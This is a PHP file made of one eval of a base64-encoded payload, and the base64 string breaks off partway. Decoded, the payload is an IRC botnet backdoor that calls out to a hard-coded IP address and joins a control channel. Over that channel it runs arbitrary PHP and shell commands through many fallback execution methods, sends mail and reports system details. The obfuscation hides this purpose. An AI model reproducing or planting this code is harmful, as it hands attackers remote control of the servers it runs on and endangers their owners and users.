<?php eval("?>".base64_decode("PD9waHAKCiRjZmcgPSBhcnJheSgKCiAgICAic2VydmVyIiA9PiAiMjAzLjEzNC4xMjEuMjM4IiwKCiAgICAicG9ydCIgPT4gIjgwIiwKCiAgICAia2V5IiA9PiAiIiwKCiAgICAicHJlZml4IiA9PiAifCIsCgogICAgIm1heHJhbmQiID0+ICI5IiwKCiAgICAiY2hhbiIgPT4gIiNwaHAiLAoKICAgICJ0cmlnZ2VyIiA9PiAiIiwKCiAgICAiaG9zdGF1dGgiID0+ICJ4IgoKKTsKCnNldF90aW1lX2xpbWl0KDApOwoKZXJyb3JfcmVwb3J0aW5nKDApOwoKJGRpciAgID0gZ2V0Y3dkKCk7CgokdW5hbWUgPSBAcGhwX3VuYW1lKCk7CgpmdW5jdGlvbiB3aGVyZWlzdG1QKCkgewoKICAgICR1cGxvYWR0bXAgPSBpbmlfZ2V0KCd1cGxvYWRfdG1wX2RpcicpOwoKICAgICR1ZiAgICAgICAgPSBnZXRlbnYoJ1VTRVJQUk9GSUxFJyk7CgogICAgJGFmICAgICAgICA9IGdldGVudignQUxMVVNFUlNQUk9GSUxFJyk7CgogICAgJHNlICAgICAgICA9IGluaV9nZXQoJ3Nlc3Npb24uc2F2ZV9wYXRoJyk7CgogICAgJGVudnRtcCAgICA9IChnZXRlbnYoJ1RNUCcpKSA/IGdldGVudignVE1QJykgOiBnZXRlbnYoJ1RFTVAnKTsKCiAgICBpZihpc19kaXIoJy90bXAnKSAmJiBpc193cml0YWJsZSgnL3RtcCcpKQoKCgogICAgICAgIHJldHVybiAnL3RtcCc7CgogICAgaWYoaXNfZGlyKCcvdXNyL3RtcCcpICYmIGlzX3dyaXRhYmxlKCcvdXNyL3RtcCcpKQoKCgogICAgICAgIHJldHVybiAnL3Vzci90bXAnOwoKICAgIGlmKGlzX2RpcignL3Zhci90bXAnKSAmJiBpc193cml0YWJsZSgnL3Zhci90bXAnKSkKCgoKICAgICAgICByZXR1cm4gJy92YXIvdG1wJzsKCiAgICBpZihpc19kaXIoJHVmKSAmJiBpc193cml0YWJsZSgkdWYpKQoKCgogICAgICAgIHJldHVybiAkdWY7CgogICAgaWYoaXNfZGlyKCRhZikgJiYgaXNfd3JpdGFibGUoJGFmKSkKCgoKICAgICAgICByZXR1cm4gJGFmOwoKICAgIGlmKGlzX2Rpcigkc2UpICYmIGlzX3dyaXRhYmxlKCRzZSkpCgoKCiAgICAgICAgcmV0dXJuICRzZTsKCiAgICBpZihpc19kaXIoJHVwbG9hZHRtcCkgJiYgaXNfd3JpdGFibGUoJHVwbG9hZHRtcCkpCgoKCiAgICAgICAgcmV0dXJuICR1cGxvYWR0bXA7CgogICAgaWYoaXNfZGlyKCRlbnZ0bXApICYmIGlzX3dyaXRhYmxlKCRlbnZ0bXApKQoKCgogICAgICAgIHJldHVybiAkZW52dG1wOwoKICAgIHJldHVybiAnLic7Cgp9CgpmdW5jdGlvbiBzcnZzaGVsTCgkY29tbWFuZCkgewoKICAgICRuYW1lID0gd2hlcmVpc3RtUCgpIC4gIlxcIiAuIHVuaXFpZCgnTkonKTsKCiAgICAkbiAgICA9IHVuaXFpZCgnTkonKTsKCiAgICAkY21kICA9IChlbXB0eSgkX1NFUlZFUlsnQ29tU3BlYyddKSkgPyAnZDpcXHdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhlJyA6ICRfU0VSVkVSWydDb21TcGVjJ107CgogICAgd2luMzJfY3JlYXRlX3NlcnZpY2UoYXJyYXkoCgogICAgICAgICdzZXJ2aWNlJyA9PiAkbiwKCiAgICAgICAgJ2Rpc3BsYXknID0+ICRuLAoKICAgICAgICAncGF0aCcgPT4gJGNtZCwKCiAgICAgICAgJ3BhcmFtcycgPT4gIi9jICRjb21tYW5kID5cIiRuYW1lXCIiCgogICAgKSk7CgogICAgd2luMzJfc3RhcnRfc2VydmljZSgkbik7CgogICAgd2luMzJfc3RvcF9zZXJ2aWNlKCRuKTsKCiAgICB3aW4zMl9kZWxldGVfc2VydmljZSgkbik7CgogICAgd2hpbGUoIWZpbGVfZXhpc3RzKCRuYW1lKSkKCiAgICAgICAgc2xlZXAoMSk7CgogICAgJGV4ZWMgPSBmaWxlX2dldF9jb250ZW50cygkbmFtZSk7CgogICAgdW5saW5rKCRuYW1lKTsKCgoKICAgIHJldHVybiAkZXhlYzsKCn0KCmZ1bmN0aW9uIGZmaXNoZWxMKCRjb21tYW5kKSB7CgogICAgJG5hbWUgPSB3aGVyZWlzdG1QKCkgLiAiXFwiIC4gdW5pcWlkKCdOSicpOwoKICAgICRhcGkgID0gbmV3IGZmaSgiW2xpYj0na2VybmVsMzIuZGxsJ10gaW50IFdpbkV4ZWMoY2hhciAqQVBQLGludCBTVyk7Iik7CgogICAgJHJlcyAgPSAkYXBpLT5XaW5FeGVjKCJjbWQuZXhlIC9jICRjb21tYW5kID5cIiRuYW1lXCIiLCAwKTsKCiAgICB3aGlsZSghZmlsZV9leGlzdHMoJG5hbWUpKQoKICAgICAgICBzbGVlcCgxKTsKCiAgICAkZXhlYyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRuYW1lKTsKCiAgICB1bmxpbmsoJG5hbWUpOwoKCgogICAgcmV0dXJuICRleGVjOwoKfQoKZnVuY3Rpb24gY29tc2hlbEwoJGNvbW1hbmQsICR3cykgewoKICAgICRleGVjID0gJHdzLT5leGVjKCJjbWQuZXhlIC9jICRjb21tYW5kIik7CgogICAgJHNvICAgPSAkZXhlYy0+U3RkT3V0KCk7CgoKCiAgICByZXR1cm4gJHNvLT5SZWFkQWxsKCk7Cgp9CgpmdW5jdGlvbiBwZXJsc2hlbEwoJGNvbW1hbmQpIHsKCiAgICAkcGVybCA9IG5ldyBwZXJsKCk7CgogICAgb2Jfc3RhcnQoKTsKCiAgICAkcGVybC0+ZXZhbCgic3lzdGVtKFwiJGNvbW1hbmRcIikiKTsKCiAgICAkZXhlYyA9IG9iX2dldF9jb250ZW50cygpOwoKICAgIG9iX2VuZF9jbGVhbigpOwoKCgogICAgcmV0dXJuICRleGVjOwoKfQoKZnVuY3Rpb24gRXhlKCRjb21tYW5kKSB7CgogICAgJGV4ZWMgID0gJG91dHB1dCA9ICcnOwoKICAgICRkZXBbXSA9IGFycmF5KAoKICAgICAgICAncGlwZScsCgogICAgICAgICdyJwoKICAgICk7CgogICAgJGRlcFtdID0gYXJyYXkoCgogICAgICAgICdwaXBlJywKCiAgICAgICAgJ3cnCgogICAgKTsKCiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKSB7CgogICAgICAgIG9iX3N0YXJ0KCk7CgogICAgICAgIEBwYXNzdGhydSgkY29tbWFuZCk7CgogICAgICAgICRleGVjID0gb2JfZ2V0X2NvbnRlbnRzKCk7CgogICAgICAgIG9iX2NsZWFuKCk7CgogICAgICAgIG9iX2VuZF9jbGVhbigpOwoKICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKSB7CgogICAgICAgICR0bXAgPSBvYl9nZXRfY29udGVudHMoKTsKCiAgICAgICAgb2JfY2xlYW4oKTsKCiAgICAgICAgQHN5c3RlbSgkY29tbWFuZCk7CgogICAgICAgICRvdXRwdXQgPSBvYl9nZXRfY29udGVudHMoKTsKCiAgICAgICAgb2JfY2xlYW4oKTsKCiAgICAgICAgJGV4ZWMgPSAkdG1wOwoKICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSkgewoKICAgICAgICBAZXhlYygkY29tbWFuZCwgJG91dHB1dCk7CgogICAgICAgICRvdXRwdXQgPSBqb2luKCJcbiIsICRvdXRwdXQpOwoKICAgICAgICAkZXhlYyAgID0gJG91dHB1dDsKCiAgICB9IGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSkKCiAgICAgICAgJGV4ZWMgPSBAc2hlbGxfZXhlYygkY29tbWFuZCk7CgogICAgZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3BvcGVuJykpIHsKCiAgICAgICAgJG91dHB1dCA9IEBwb3BlbigkY29tbWFuZCwgJ3InKTsKCiAgICAgICAgd2hpbGUgKCFmZW9mKCRvdXRwdXQpKSB7CgogICAgICAgICAgICAkZXhlYyA9IGZnZXRzKCRvdXRwdXQpOwoKICAgICAgICB9CgogICAgICAgIHBjbG9zZSgkb3V0cHV0KTsKCiAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdwcm9jX29wZW4nKSkgewoKICAgICAgICAkcmVzID0gQHByb2Nfb3BlbigkY29tbWFuZCwgJGRlcCwgJHBpcGVzKTsKCiAgICAgICAgd2hpbGUgKCFmZW9mKCRwaXBlc1sxXSkpIHsKCiAgICAgICAgICAgICRsaW5lID0gZmdldHMoJHBpcGVzWzFdKTsKCiAgICAgICAgICAgICRvdXRwdXQgLj0gJGxpbmU7CgogICAgICAgIH0KCiAgICAgICAgJGV4ZWMgPSAkb3V0cHV0OwoKICAgICAgICBwcm9jX2Nsb3NlKCRyZXMpOwoKICAgIH0gZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnd2luX3NoZWxsX2V4ZWN1dGUnKSAmJiBzdHJ0b3VwcGVyKHN1YnN0cihQSFBfT1MsIDAsIDMpKSA9PT0gJ1dJTicpCgogICAgICAgICRleGVjID0gd2luc2hlbEwoJGNvbW1hbmQpOwoKICAgIGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3dpbjMyX2NyZWF0ZV9zZXJ2aWNlJykgJiYgc3RydG91cHBlcihzdWJzdHIoUEhQX09TLCAwLCAzKSkgPT09ICdXSU4nKQoKICAgICAgICAkZXhlYyA9IHNydnNoZWxMKCRjb21tYW5kKTsKCiAgICBlbHNlaWYoZXh0ZW5zaW9uX2xvYWRlZCgnZmZpJykgJiYgc3RydG91cHBlcihzdWJzdHIoUEhQX09TLCAwLCAzKSkgPT09ICdXSU4nKQoKICAgICAgICAkZXhlYyA9IGZmaXNoZWxMKCRjb21tYW5kKTsKCiAgICBlbHNlaWYoZXh0ZW5zaW9uX2xvYWRlZCgncGVybCcpKQoKICAgICAgICAkZXhlYyA9IHBlcmxzaGVsTCgkY29tbWFuZCk7CgoKCiAgICByZXR1cm4gJGV4ZWM7Cgp9CgpjbGFzcyBwQm90IHsKCiAgICBwdWJsaWMgJGNvbmZpZyA9ICcnOwoKICAgIHB1YmxpYyAkdXNlcl9hZ2VudHMgPSBhcnJheSgKCiAgICAgICAgIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW4tVVMpIEFwcGxlV2ViS2l0LzUzNC4xNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMC4wLjY0OC4yMDQgU2FmYXJpLzUzNC4xNiIsCgogICAgICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMTcgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjQuMC4xMzEyLjYwIFNhZmFyaS81MzcuMTciLAoKICAgICAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4yKSBBcHBsZVdlYktpdC81MzYuMyAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xOS4wLjEwNjEuMSBTYWZhcmkvNTM2LjMiLAoKICAgICAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBydjoxNS4wKSBHZWNrby8yMDEyMDcxNiBGaXJlZm94LzE1LjBhMiIsCgogICAgICAgICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA1LjE7IHJ2OjEyLjApIEdlY2tvLzIwMTIwNDAzMjExNTA3IEZpcmVmb3gvMTIuMCIsCgogICAgICAgICJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSAxMC4wOyBXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNi4wKSIsCgogICAgICAgICJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA4LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzQuMDsgR1RCNy40OyBJbmZvUGF0aC4yOyBTVjE7IC5ORVQgQ0xSIDMuMy42OTU3MzsgV09XNjQ7IGVuLVVTKSIsCgogICAgICAgICJPcGVyYS85LjgwIChXaW5kb3dzIE5UIDYuMTsgVTsgZXMtRVMpIFByZXN0by8yLjkuMTgxIFZlcnNpb24vMTIuMDAiCgogICAgKTsKCiAgICBwdWJsaWMgJGNoYXJzZXQgPSAiMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoiOwoKICAgIHB1YmxpYyAkdXNlcnMgPSBhcnJheSgpOwoKICAgIHB1YmxpYyBmdW5jdGlvbiBzdGFydCgkY2ZnKSB7CgogICAgICAgICR0aGlzLT5jb25maWcgPSAkY2ZnOwoKICAgICAgICB3aGlsZSAodHJ1ZSkgewoKICAgICAgICAgICAgaWYoISgkdGhpcy0+Y29ubiA9IGZzb2Nrb3BlbigkdGhpcy0+Y29uZmlnWydzZXJ2ZXInXSwgJHRoaXMtPmNvbmZpZ1sncG9ydCddLCAkZSwgJHMsIDMwKSkpCgogICAgICAgICAgICAgICAgJHRoaXMtPnN0YXJ0KCRjZmcpOwoKICAgICAgICAgICAgJGlkZW50ID0gJHRoaXMtPmNvbmZpZ1sncHJlZml4J107CgogICAgICAgICAgICAkYWxwaCAgPSByYW5nZSgiMCIsICI5Iik7CgogICAgICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICR0aGlzLT5jb25maWdbJ21heHJhbmQnXTsgJGkrKykKCiAgICAgICAgICAgICAgICAkaWRlbnQgLj0gJGFscGhbcmFuZCgwLCA5KV07CgogICAgICAgICAgICAkdGhpcy0+c2VuZCgiVVNFUiAiIC4gJGlkZW50IC4gIiAxMjcuMC4wLjEgbG9jYWxob3N0IDoiIC4gcGhwX3VuYW1lKCkgLiAiIik7CgogICAgICAgICAgICAkdGhpcy0+c2V0X25pY2soKTsKCiAgICAgICAgICAgICR0aGlzLT5tYWluKCk7CgogICAgICAgIH0KCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIG1haW4oKSB7CgogICAgICAgIHdoaWxlICghZmVvZigkdGhpcy0+Y29ubikpIHsKCiAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ3N0cmVhbV9zZWxlY3QnKSkgewoKICAgICAgICAgICAgICAgICRyZWFkICAgID0gYXJyYXkoCgogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jb25uCgogICAgICAgICAgICAgICAgKTsKCiAgICAgICAgICAgICAgICAkd3JpdGUgICA9IE5VTEw7CgogICAgICAgICAgICAgICAgJGV4Y2VwdCAgPSBOVUxMOwoKICAgICAgICAgICAgICAgICRjaGFuZ2VkID0gc3RyZWFtX3NlbGVjdCgkcmVhZCwgJHdyaXRlLCAkZXhjZXB0LCAzMCk7CgogICAgICAgICAgICAgICAgaWYgKCRjaGFuZ2VkID09IDApIHsKCiAgICAgICAgICAgICAgICAgICAgZndyaXRlKCR0aGlzLT5jb25uLCAiUElORyA6bGVsY29tZWF0bWVcclxuIik7CgogICAgICAgICAgICAgICAgICAgICRyZWFkICAgID0gYXJyYXkoCgogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y29ubgoKICAgICAgICAgICAgICAgICAgICApOwoKICAgICAgICAgICAgICAgICAgICAkd3JpdGUgICA9IE5VTEw7CgogICAgICAgICAgICAgICAgICAgICRleGNlcHQgID0gTlVMTDsKCiAgICAgICAgICAgICAgICAgICAgJGNoYW5nZWQgPSBzdHJlYW1fc2VsZWN0KCRyZWFkLCAkd3JpdGUsICRleGNlcHQsIDMwKTsKCiAgICAgICAgICAgICAgICAgICAgaWYoJGNoYW5nZWQgPT0gMCkKCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5idWYgPSB0cmltKGZnZXRzKCR0aGlzLT5jb25uLCA1MTIpKTsKCiAgICAgICAgICAgICRjbWQgICAgICAgPSBleHBsb2RlKCIgIiwgJHRoaXMtPmJ1Zik7CgogICAgICAgICAgICBpZiAoc3Vic3RyKCR0aGlzLT5idWYsIDAsIDYpID09ICJQSU5HIDoiKSB7CgogICAgICAgICAgICAgICAgJHRoaXMtPnNlbmQoIlBPTkcgOiIgLiBzdWJzdHIoJHRoaXMtPmJ1ZiwgNikpOwoKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKGlzc2V0KCRjbWRbMV0pICYmICRjbWRbMV0gPT0gIjAwMSIpIHsKCiAgICAgICAgICAgICAgICAkdGhpcy0+am9pbigkdGhpcy0+Y29uZmlnWydjaGFuJ10sICR0aGlzLT5jb25maWdbJ2tleSddKTsKCiAgICAgICAgICAgICAgICBjb250aW51ZTsKCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmIChpc3NldCgkY21kWzFdKSAmJiAkY21kWzFdID09ICI0MzMiKSB7CgogICAgICAgICAgICAgICAgJHRoaXMtPnNldF9uaWNrKCk7CgogICAgICAgICAgICAgICAgY29udGludWU7CgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJHRoaXMtPmJ1ZiAhPSAkb2xkX2J1ZikgewoKICAgICAgICAgICAgICAgICRtY21kICAgPSBhcnJheSgpOwoKICAgICAgICAgICAgICAgICRtc2cgICAgPSBzdWJzdHIoc3Ryc3RyKCR0aGlzLT5idWYsICIgOiIpLCAyKTsKCiAgICAgICAgICAgICAgICAkbXNnY21kID0gZXhwbG9kZSgiICIsICRtc2cpOwoKICAgICAgICAgICAgICAgICRuaWNrICAgPSBleHBsb2RlKCIhIiwgJGNtZFswXSk7CgogICAgICAgICAgICAgICAgJHZob3N0ICA9IGV4cGxvZGUoIkAiLCAkbmlja1sxXSk7CgogICAgICAgICAgICAgICAgJHZob3N0ICA9ICR2aG9zdFsxXTsKCiAgICAgICAgICAgICAgICAkbmljayAgID0gc3Vic3RyKCRuaWNrWzBdLCAxKTsKCiAgICAgICAgICAgICAgICAkaG9zdCAgID0gJGNtZFswXTsKCiAgICAgICAgICAgICAgICBpZigkbXNnY21kWzBdID09ICR0aGlzLT5uaWNrKQoKICAgICAgICAgICAgICAgICAgICBmb3IoJGkgPSAwOyAkaSA8IGNvdW50KCRtc2djbWQpOyAkaSsrKQoKICAgICAgICAgICAgICAgICAgICAgICAgJG1jbWRbJGldID0gJG1zZ2NtZFskaSArIDFdOwogICAgICAgICAgICAgICAgZWxzZQoKICAgICAgICAgICAgICAgICAgICBmb3IoJGkgPSAwOyAkaSA8IGNvdW50KCRtc2djbWQpOyAkaSsrKQoKICAgICAgICAgICAgICAgICAgICAgICAgJG1jbWRbJGldID0gJG1zZ2NtZFskaV07CgogICAgICAgICAgICAgICAgaWYgKGNvdW50KCRjbWQpID4gMikgewoKICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKCRjbWRbMV0pIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgIlBSSVZNU0ciOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdmhvc3QgPT0gJHRoaXMtPmNvbmZpZ1snaG9zdGF1dGgnXSB8fCAkdGhpcy0+Y29uZmlnWydob3N0YXV0aCddID09ICIqIikgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3Vic3RyKCRtY21kWzBdLCAwLCAxKSA9PSAiLiIpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoc3Vic3RyKCRtY21kWzBdLCAxKSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgIm1haWwiOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY291bnQoJG1jbWQpID4gNCkgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGhlYWRlciA9ICJGcm9tOiA8IiAuICRtY21kWzJdIC4gIj4iOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFtYWlsKCRtY21kWzFdLCAkbWNtZFszXSwgc3Ryc3RyKCRtc2csICRtY21kWzRdKSwgJGhlYWRlcikpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJtYWlsXDJdOiBmYWlsZWQgc2VuZGluZy4iKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wybWFpbFwyXTogc2VudC4iKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJkbnMiOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNzZXQoJG1jbWRbMV0pKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXAgPSBleHBsb2RlKCIuIiwgJG1jbWRbMV0pOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50KCRpcCkgPT0gNCAmJiBpc19udW1lcmljKCRpcFswXSkgJiYgaXNfbnVtZXJpYygkaXBbMV0pICYmIGlzX251bWVyaWMoJGlwWzJdKSAmJiBpc19udW1lcmljKCRpcFszXSkpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJkbnNcMl06ICIgLiAkbWNtZFsxXSAuICIgPT4gIiAuIGdldGhvc3RieWFkZHIoJG1jbWRbMV0pKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyZG5zXDJdOiAiIC4gJG1jbWRbMV0gLiAiID0+ICIgLiBnZXRob3N0YnluYW1lKCRtY21kWzFdKSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidW5hbWUiOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoQGluaV9nZXQoInNhZmVfbW9kZSIpIG9yIHN0cnRvbG93ZXIoQGluaV9nZXQoInNhZmVfbW9kZSIpKSA9PSAib24iKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2FmZW1vZGUgPSAib24iOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNhZmVtb2RlID0gIm9mZiI7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHVuYW1lID0gcGhwX3VuYW1lKCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMmluZm9cMl06ICIgLiAkdW5hbWUgLiAiIChzYWZlOiAiIC4gJHNhZmVtb2RlIC4gIikiKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAicm5kbmljayI6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zZXRfbmljaygpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJyYXciOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2VuZChzdHJzdHIoJG1zZywgJG1jbWRbMV0pKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiZXZhbCI6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9iX3N0YXJ0KCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2YWwoc3Ryc3RyKCRtc2csICRtY21kWzFdKSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRleGVjID0gb2JfZ2V0X2NvbnRlbnRzKCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9iX2VuZF9jbGVhbigpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmV0ID0gZXhwbG9kZSgiXG4iLCAkZXhlYyk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcigkaSA9IDA7ICRpIDwgY291bnQoJHJldCk7ICRpKyspCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkcmV0WyRpXSAhPSBOVUxMKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIiAgICAgIDogIiAuIHRyaW0oJHJldFskaV0pKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiZXhlYyI6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb21tYW5kID0gc3Vic3RyKHN0cnN0cigkbXNnLCAkbWNtZFswXSksIHN0cmxlbigkbWNtZFswXSkgKyAxKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4ZWMgICAgPSBleGVjKCRjb21tYW5kKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJldCAgICAgPSBleHBsb2RlKCJcbiIsICRleGVjKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRpID0gMDsgJGkgPCBjb3VudCgkcmV0KTsgJGkrKykKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRyZXRbJGldICE9IE5VTEwpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiICAgICAgOiAiIC4gdHJpbSgkcmV0WyRpXSkpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJjbWQiOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWFuZCA9IHN1YnN0cihzdHJzdHIoJG1zZywgJG1jbWRbMF0pLCBzdHJsZW4oJG1jbWRbMF0pICsgMSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRleGVjICAgID0gRXhlKCRjb21tYW5kKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJldCAgICAgPSBleHBsb2RlKCJcbiIsICRleGVjKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRpID0gMDsgJGkgPCBjb3VudCgkcmV0KTsgJGkrKykKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRyZXRbJGldICE9IE5VTEwpC